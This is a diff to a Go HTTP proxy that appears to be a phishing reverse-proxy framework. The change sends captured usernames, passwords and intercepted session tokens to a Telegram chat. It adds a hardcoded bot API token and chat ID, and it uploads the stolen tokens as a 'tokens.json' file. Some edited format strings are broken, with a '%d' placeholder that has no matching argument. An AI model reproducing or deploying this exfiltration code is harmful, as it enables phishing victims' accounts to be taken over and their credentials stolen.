@@ -507,7 +507,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Username: %s ", um[1]))
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("[%d] Username: %s ", um[1]))
 											bot.Send(msg)
 										}
 									}
@@ -520,7 +520,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												log.Error("database: %v", err)
 											}
 											// Send Telegram notification
-											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("Password: %s ", pm[1]))
+											msg := tgbotapi.NewMessage(5822512651, fmt.Sprintf("[%d] Password: %s ", pm[1]))
 											bot.Send(msg)
 										}
 									}
@@ -870,23 +870,43 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
 			}
 
+			bot, err = tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+			if err != nil {
+				log.Fatal("Failed to initialize Telegram bot:", err)
+			}
+
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
 				if ok && s.IsDone {
 					for _, au := range pl.authUrls {
 						if au.MatchString(resp.Request.URL.Path) {
 							err := p.db.SetSessionTokens(ps.SessionId, s.Tokens)
+							tokensBytes, err := json.Marshal(s.Tokens)
 							if err != nil {
 								log.Error("database: %v", err)
+								log.Error("Error marshaling tokens to JSON:", err)
 							}
 							if err == nil {
 								log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
+								fileData := tgbotapi.FileBytes{
+									Name:   "tokens.json",
+									Bytes:  tokensBytes,
+								}
+								msg := tgbotapi.NewDocument(5822512651, fileData)
+								_, err = bot.Send(msg) // Use the bot instance initialized outside this function
+								if err != nil {
+									log.Error("Error sending tokens to Telegram:", err)
+								} else {
+									log.Success("Tokens sent to Telegram")
+								}
 							}
 							break
 						}
 					}
 				}
 			}
+
+			
 
 			if pl != nil && ps.SessionId != "" {
 				s, ok := p.sessions[ps.SessionId]
